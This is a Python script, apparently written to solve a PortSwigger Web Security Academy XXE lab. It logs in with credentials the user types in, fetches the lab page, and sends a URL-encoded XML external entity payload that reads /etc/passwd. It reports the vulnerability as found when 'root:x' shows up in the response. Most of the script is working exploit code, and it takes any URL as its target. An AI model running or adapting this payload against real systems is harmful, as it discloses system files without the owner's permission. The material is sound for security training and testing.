import requests

def login_to_portswigger(username, password):
    login_url = "https://portswigger.net/users/login"
    session = requests.Session()
    
    login_payload = {
        'username': username,
        'password': password
    }

    try:
        login_response = session.post(login_url, data=login_payload)
        
        if login_response.status_code == 200 and 'Welcome' in login_response.text:
            print("[+] Successfully logged in to PortSwigger.")
            return session
        else:
            print("[-] Failed to log in to PortSwigger.")
            print(f"Status Code: {login_response.status_code}")
            print(f"Response Text: {login_response.text}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")
        return None

def access_xxe_lab(session, lab_url):
    try:
        lab_response = session.get(lab_url)
        
        if lab_response.status_code == 200:
            print("[+] Successfully accessed the XXE lab.")
            return lab_response.text
        else:
            print("[-] Failed to access the XXE lab.")
            print(f"Status Code: {lab_response.status_code}")
            print(f"Response Text: {lab_response.text}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")
        return None

def check_xxe_vulnerability(session, lab_url):
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>'''
    
    # URL-encode the payload
    xxe_payload_encoded = requests.utils.quote(xxe_payload)
    full_url = f"{lab_url}?xml={xxe_payload_encoded}"

    try:
        response = session.get(full_url, timeout=10)

        if 'root:x' in response.text:
            print(f"[+] XXE vulnerability detected! The target is disclosing /etc/passwd")
            print(response.text)
        else:
            print(f"[-] No XXE vulnerability detected or the target is not disclosing /etc/passwd")
            print(f"Response Text: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")

# Example usage
username = input("Enter your PortSwigger username: ")
password = input("Enter your PortSwigger password: ")
lab_url = input("Enter the XXE lab URL: ")

session = login_to_portswigger(username, password)

if session:
    lab_content = access_xxe_lab(session, lab_url)
    if lab_content:
        check_xxe_vulnerability(session, lab_url)
